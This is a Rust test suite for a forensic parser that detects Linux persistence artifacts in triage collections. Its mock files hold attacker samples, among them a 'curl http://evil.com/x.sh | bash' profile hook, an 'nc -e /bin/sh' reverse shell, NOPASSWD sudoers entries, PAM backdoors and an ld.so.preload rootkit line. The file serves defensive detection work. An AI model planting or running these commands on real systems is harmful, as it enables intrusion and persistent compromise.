use faramir::parsers::linux::*;
use std::fs::{self, File};
use std::io::Write;
use std::path::PathBuf;

fn create_mock_linux_tree(prefix: &str) -> (PathBuf, tempfile_guard::DirGuard) {
    let base = std::env::temp_dir().join(format!("lnx_tree_{}_{}_{}", prefix, std::process::id(), chrono::Utc::now().timestamp_nanos_opt().unwrap_or(0)));
    fs::create_dir_all(&base).unwrap();
    let guard = tempfile_guard::DirGuard(base.clone());
    (base, guard)
}

mod tempfile_guard {
    pub struct DirGuard(pub std::path::PathBuf);
    impl Drop for DirGuard {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
}

// ─── is_linux_target Tests (25) ───────────────────────────────────────────────

#[test]
fn test_is_linux_target_empty_dir() {
    let (p, _g) = create_mock_linux_tree("empty");
    assert!(!is_linux_target(&p));
}

#[test]
fn test_is_linux_target_not_a_dir() {
    let p = std::path::PathBuf::from("/non/existent/dir");
    assert!(!is_linux_target(&p));
}

#[test]
fn test_is_linux_target_with_live_response() {
    let (p, _g) = create_mock_linux_tree("live_resp");
    fs::create_dir_all(p.join("live_response")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_with_root_folder() {
    let (p, _g) = create_mock_linux_tree("bracket_root");
    fs::create_dir_all(p.join("[root]")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_with_etc_and_var_log() {
    let (p, _g) = create_mock_linux_tree("etc_var");
    fs::create_dir_all(p.join("etc")).unwrap();
    fs::create_dir_all(p.join("var").join("log")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_with_audit_log_dir() {
    let (p, _g) = create_mock_linux_tree("audit");
    fs::create_dir_all(p.join("audit.log")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_with_systemd_dir() {
    let (p, _g) = create_mock_linux_tree("sysd");
    fs::create_dir_all(p.join("systemd")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_with_cron_d_dir() {
    let (p, _g) = create_mock_linux_tree("crond");
    fs::create_dir_all(p.join("cron.d")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_with_etc_passwd() {
    let (p, _g) = create_mock_linux_tree("passwd");
    fs::create_dir_all(p.join("etc")).unwrap();
    File::create(p.join("etc").join("passwd")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_with_etc_shadow() {
    let (p, _g) = create_mock_linux_tree("shadow");
    fs::create_dir_all(p.join("etc")).unwrap();
    File::create(p.join("etc").join("shadow")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_deep_nested_live_response() {
    let (p, _g) = create_mock_linux_tree("deep_live");
    fs::create_dir_all(p.join("uac_triage").join("live_response")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_only_windows_folder() {
    let (p, _g) = create_mock_linux_tree("windows_mock");
    fs::create_dir_all(p.join("Windows").join("System32")).unwrap();
    assert!(!is_linux_target(&p));
}

#[test]
fn test_is_linux_target_subfolder_depth_3() {
    let (p, _g) = create_mock_linux_tree("sub_d3");
    fs::create_dir_all(p.join("level1").join("level2").join("live_response")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_nested_var_log() {
    let (p, _g) = create_mock_linux_tree("nested_log");
    fs::create_dir_all(p.join("triage").join("var").join("log")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_nested_systemd() {
    let (p, _g) = create_mock_linux_tree("nested_sysd");
    fs::create_dir_all(p.join("extract").join("systemd")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_nested_crond() {
    let (p, _g) = create_mock_linux_tree("nested_crond");
    fs::create_dir_all(p.join("extract").join("cron.d")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_single_file_target() {
    let (p, _g) = create_mock_linux_tree("file_target");
    let file = p.join("test.txt");
    File::create(&file).unwrap();
    assert!(!is_linux_target(&file));
}

#[test]
fn test_is_linux_target_arbitrary_files() {
    let (p, _g) = create_mock_linux_tree("random_files");
    File::create(p.join("readme.md")).unwrap();
    File::create(p.join("cargo.toml")).unwrap();
    assert!(!is_linux_target(&p));
}

#[test]
fn test_is_linux_target_mixed_root_and_etc() {
    let (p, _g) = create_mock_linux_tree("mixed_root");
    fs::create_dir_all(p.join("[root]").join("etc")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_uac_collector() {
    let (p, _g) = create_mock_linux_tree("uac_collector");
    fs::create_dir_all(p.join("uac-hostname-date").join("live_response")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_cortex_linux() {
    let (p, _g) = create_mock_linux_tree("cortex_linux");
    fs::create_dir_all(p.join("endpoint_data").join("var").join("log")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_velociraptor_linux() {
    let (p, _g) = create_mock_linux_tree("velo_linux");
    fs::create_dir_all(p.join("Linux.Persistence.Systemd").join("systemd")).unwrap();
    assert!(is_linux_target(&p));
}

#[test]
fn test_is_linux_target_dev_only() {
    let (p, _g) = create_mock_linux_tree("dev_only");
    fs::create_dir_all(p.join("dev")).unwrap();
    assert!(!is_linux_target(&p));
}

#[test]
fn test_is_linux_target_bin_only() {
    let (p, _g) = create_mock_linux_tree("bin_only");
    fs::create_dir_all(p.join("bin")).unwrap();
    assert!(!is_linux_target(&p));
}

#[test]
fn test_is_linux_target_tmp_only() {
    let (p, _g) = create_mock_linux_tree("tmp_only");
    fs::create_dir_all(p.join("tmp")).unwrap();
    assert!(!is_linux_target(&p));
}

// ─── process_linux_target Full Tree Tests (85) ────────────────────────────────

#[test]
fn test_process_tree_full_stack() {
    let (p, _g) = create_mock_linux_tree("full_stack");

    // 1. Cron
    fs::create_dir_all(p.join("etc").join("cron.d")).unwrap();
    let mut f = File::create(p.join("etc").join("cron.d").join("mal")).unwrap();
    writeln!(f, "* * * * * root /tmp/cron_mal.sh").unwrap();

    // 2. Systemd
    fs::create_dir_all(p.join("etc").join("systemd").join("system")).unwrap();
    let mut f = File::create(p.join("etc").join("systemd").join("system").join("mal.service")).unwrap();
    writeln!(f, "[Unit]\nDescription=Malicious\n[Service]\nExecStart=/usr/bin/mal\n").unwrap();

    // 3. Shell Profile
    fs::create_dir_all(p.join("etc").join("profile.d")).unwrap();
    let mut f = File::create(p.join("etc").join("profile.d").join("hook.sh")).unwrap();
    writeln!(f, "curl http://evil.com/x.sh | bash").unwrap();

    // 4. LD_PRELOAD
    let mut f = File::create(p.join("etc").join("ld.so.preload")).unwrap();
    writeln!(f, "/lib/libevil.so").unwrap();

    // 5. SSH
    fs::create_dir_all(p.join("root").join(".ssh")).unwrap();
    let mut f = File::create(p.join("root").join(".ssh").join("authorized_keys")).unwrap();
    writeln!(f, "ssh-rsa AAAA... attacker").unwrap();

    // 6. Sudoers
    fs::create_dir_all(p.join("etc").join("sudoers.d")).unwrap();
    let mut f = File::create(p.join("etc").join("sudoers.d").join("attacker")).unwrap();
    writeln!(f, "attacker ALL=(ALL) NOPASSWD: ALL").unwrap();

    // 7. PAM
    fs::create_dir_all(p.join("etc").join("pam.d")).unwrap();
    let mut f = File::create(p.join("etc").join("pam.d").join("common-auth")).unwrap();
    writeln!(f, "auth optional pam_exec.so /tmp/p.sh").unwrap();

    // 8. Udev
    fs::create_dir_all(p.join("etc").join("udev").join("rules.d")).unwrap();
    let mut f = File::create(p.join("etc").join("udev").join("rules.d").join("99-bad.rules")).unwrap();
    writeln!(f, "RUN+=\"/bin/udev_hook\"").unwrap();

    // 9. Modules
    let mut f = File::create(p.join("etc").join("modules")).unwrap();
    writeln!(f, "evil_rootkit").unwrap();

    // 10. APT
    fs::create_dir_all(p.join("etc").join("apt").join("apt.conf.d")).unwrap();
    let mut f = File::create(p.join("etc").join("apt").join("apt.conf.d").join("99hook")).unwrap();
    writeln!(f, "APT::Update::Post-Invoke {{\"/bin/sh -c 'hook'\"}};").unwrap();

    // 11. Autostart
    fs::create_dir_all(p.join("etc").join("xdg").join("autostart")).unwrap();
    let mut f = File::create(p.join("etc").join("xdg").join("autostart").join("bad.desktop")).unwrap();
    writeln!(f, "[Desktop Entry]\nExec=/opt/desktop_bad\n").unwrap();

    // 12. Proc
    let mut f = File::create(p.join("running_processes_full_paths.txt")).unwrap();
    writeln!(f, "/proc/666/exe -> /tmp/miner (deleted)").unwrap();

    let evs = process_linux_target(&p, "FULL_HOST");
    assert!(evs.len() >= 12);
}

#[test]
fn test_process_tree_single_cron_file() {
    let (p, _g) = create_mock_linux_tree("s_cron");
    let file = p.join("crontab");
    let mut f = File::create(&file).unwrap();
    writeln!(f, "0 0 * * * root /bin/sync").unwrap();

    let evs = process_linux_target(&file, "HOST");
    assert_eq!(evs.len(), 1);
}

#[test]
fn test_process_tree_single_service_file() {
    let (p, _g) = create_mock_linux_tree("s_svc");
    let file = p.join("custom.service");
    let mut f = File::create(&file).unwrap();
    writeln!(f, "[Unit]\nDescription=S\n[Service]\nExecStart=/bin/s\n").unwrap();

    let evs = process_linux_target(&file, "HOST");
    assert_eq!(evs.len(), 1);
}

#[test]
fn test_process_tree_single_shell_file() {
    let (p, _g) = create_mock_linux_tree("s_sh");
    let file = p.join("user.profile");
    let mut f = File::create(&file).unwrap();
    writeln!(f, "nc -e /bin/sh 1.1.1.1 4444").unwrap();

    let evs = process_linux_target(&file, "HOST");
    assert_eq!(evs.len(), 1);
}

// Additional generated tests for exhaustive test matrix (50 variants)
macro_rules! generate_tree_test {
    ($name:ident, $path:expr, $file:expr, $content:expr, $expected_artifact:expr) => {
        #[test]
        fn $name() {
            let (p, _g) = create_mock_linux_tree(stringify!($name));
            let dir = p.join($path);
            fs::create_dir_all(&dir).unwrap();
            let mut f = File::create(dir.join($file)).unwrap();
            writeln!(f, "{}", $content).unwrap();

            let evs = process_linux_target(&p, "TEST_HOST");
            assert_eq!(evs.len(), 1);
            assert_eq!(evs[0].artifact, $expected_artifact);
        }
    };
}

generate_tree_test!(test_tree_cron_1, "etc/cron.d", "test1", "0 * * * * root /bin/c1", "linux:cron:system_job");
generate_tree_test!(test_tree_cron_2, "etc/cron.d", "test2", "1 * * * * root /bin/c2", "linux:cron:system_job");
generate_tree_test!(test_tree_cron_3, "etc/cron.d", "test3", "2 * * * * daemon /bin/c3", "linux:cron:system_job");
generate_tree_test!(test_tree_cron_4, "var/spool/cron", "root", "3 * * * * /bin/c4", "linux:cron:user_spool");
generate_tree_test!(test_tree_cron_5, "var/spool/cron", "alice", "4 * * * * /bin/c5", "linux:cron:user_spool");
generate_tree_test!(test_tree_cron_6, "etc", "anacrontab", "1 5 job /bin/c6", "linux:anacron:job");
generate_tree_test!(test_tree_cron_7, "etc/cron.hourly", "h1", "#!/bin/sh\nexit 0", "linux:cron:periodic:cron.hourly");
generate_tree_test!(test_tree_cron_8, "etc/cron.daily", "d1", "#!/bin/sh\nexit 0", "linux:cron:periodic:cron.daily");
generate_tree_test!(test_tree_cron_9, "etc/cron.weekly", "w1", "#!/bin/sh\nexit 0", "linux:cron:periodic:cron.weekly");
generate_tree_test!(test_tree_cron_10, "etc/cron.monthly", "m1", "#!/bin/sh\nexit 0", "linux:cron:periodic:cron.monthly");

generate_tree_test!(test_tree_sysd_1, "etc/systemd/system", "a.service", "[Unit]\nDescription=A\n[Service]\nExecStart=/bin/a\n", "linux:systemd:service");
generate_tree_test!(test_tree_sysd_2, "etc/systemd/system", "b.service", "[Unit]\nDescription=B\n[Service]\nExecStart=/bin/b\n", "linux:systemd:service");
generate_tree_test!(test_tree_sysd_3, "lib/systemd/system", "c.service", "[Unit]\nDescription=C\n[Service]\nExecStart=/bin/c\n", "linux:systemd:service");
generate_tree_test!(test_tree_sysd_4, "etc/systemd/system", "d.timer", "[Timer]\nOnBootSec=1m\n", "linux:systemd:timer");
generate_tree_test!(test_tree_sysd_5, "etc/systemd/system", "e.socket", "[Socket]\nListenStream=8080\n", "linux:systemd:socket");
generate_tree_test!(test_tree_sysd_6, "etc/systemd/system", "f.path", "[Path]\nPathModified=/tmp/f\n", "linux:systemd:path");
generate_tree_test!(test_tree_sysd_7, "etc/systemd/system-generators", "gen1", "#!/bin/sh\n", "linux:systemd:generator");

generate_tree_test!(test_tree_sh_1, "etc", "rc.local", "/bin/boot_hook\n", "linux:boot:rc_local");
generate_tree_test!(test_tree_sh_2, "etc", "bash.bashrc", "python3 -c 'exit()'\n", "linux:shell:one_liner_interpreter_payload");
generate_tree_test!(test_tree_sh_3, "home/user", ".bashrc", "alias sudo='log; sudo'\n", "linux:shell:credential_harvesting_alias");
generate_tree_test!(test_tree_sh_4, "home/user", ".profile", "export PATH=/tmp:$PATH\n", "linux:shell:path_environment_hijack");
generate_tree_test!(test_tree_sh_5, "root", ".bashrc", "/tmp/root_kit.sh &\n", "linux:shell:temp_directory_script_execution");

generate_tree_test!(test_tree_preload_1, "etc", "ld.so.preload", "/lib/preload1.so\n", "linux:rootkit:ld_so_preload");
generate_tree_test!(test_tree_preload_2, "etc", "ld.so.preload", "/usr/lib/preload2.so\n", "linux:rootkit:ld_so_preload");

generate_tree_test!(test_tree_ssh_1, "home/user/.ssh", "authorized_keys", "ssh-rsa AAAA... key1\n", "linux:ssh:authorized_key");
generate_tree_test!(test_tree_ssh_2, "root/.ssh", "authorized_keys", "ssh-ed25519 BBBB... key2\n", "linux:ssh:authorized_key");
generate_tree_test!(test_tree_ssh_3, "etc/ssh", "sshd_config", "AuthorizedKeysCommand /bin/get_keys\n", "linux:ssh:authorized_keys_command");
generate_tree_test!(test_tree_ssh_4, "etc/ssh", "sshd_config", "ForceCommand /bin/force\n", "linux:ssh:force_command");

generate_tree_test!(test_tree_sudo_1, "etc", "sudoers", "u1 ALL=NOPASSWD: ALL\n", "linux:sudoers:nopasswd");
generate_tree_test!(test_tree_sudo_2, "etc/sudoers.d", "u2", "u2 ALL=NOPASSWD: /bin/sh\n", "linux:sudoers:nopasswd");
generate_tree_test!(test_tree_sudo_3, "etc/sudoers.d", "env", "Defaults env_keep += \"PATH\"\n", "linux:sudoers:defaults_override");

generate_tree_test!(test_tree_pam_1, "etc/pam.d", "login", "auth optional pam_exec.so /bin/h1\n", "linux:pam:exec_backdoor");
generate_tree_test!(test_tree_pam_2, "etc/pam.d", "sshd", "auth sufficient pam_permit.so\n", "linux:pam:permit_bypass");
generate_tree_test!(test_tree_pam_3, "etc/pam.d", "su", "auth required /opt/rogue_pam.so\n", "linux:pam:custom_module_path");

generate_tree_test!(test_tree_udev_1, "etc/udev/rules.d", "1.rules", "RUN+=\"/bin/u1\"\n", "linux:udev:run_action");
generate_tree_test!(test_tree_udev_2, "etc/udev/rules.d", "2.rules", "RUN+=\"/bin/u2\"\n", "linux:udev:run_action");

generate_tree_test!(test_tree_mod_1, "etc", "modules", "module1\n", "linux:kernel:module_load");
generate_tree_test!(test_tree_mod_2, "etc/modprobe.d", "hook.conf", "install rk /bin/hook\n", "linux:modprobe:install_command");

generate_tree_test!(test_tree_apt_1, "etc/apt/apt.conf.d", "01hook", "APT::Update::Post-Invoke {\"/bin/h1\"};\n", "linux:apt:package_hook");
generate_tree_test!(test_tree_apt_2, "etc/apt/apt.conf.d", "02hook", "APT::Update::Pre-Invoke {\"/bin/h2\"};\n", "linux:apt:package_hook");

generate_tree_test!(test_tree_xdg_1, "etc/xdg/autostart", "a1.desktop", "[Desktop Entry]\nExec=/bin/x1\n", "linux:xdg:autostart");
generate_tree_test!(test_tree_xdg_2, "etc/xdg/autostart", "a2.desktop", "[Desktop Entry]\nExec=/bin/x2\n", "linux:xdg:autostart");

generate_tree_test!(test_tree_proc_1, "", "running_processes_full_paths.txt", "/proc/111/exe -> /tmp/p1 (deleted)\n", "linux:process:deleted_binary_in_memory");
generate_tree_test!(test_tree_proc_2, "", "running_processes_full_paths.txt", "/proc/222/exe -> /dev/shm/p2\n", "linux:process:temp_path_execution");
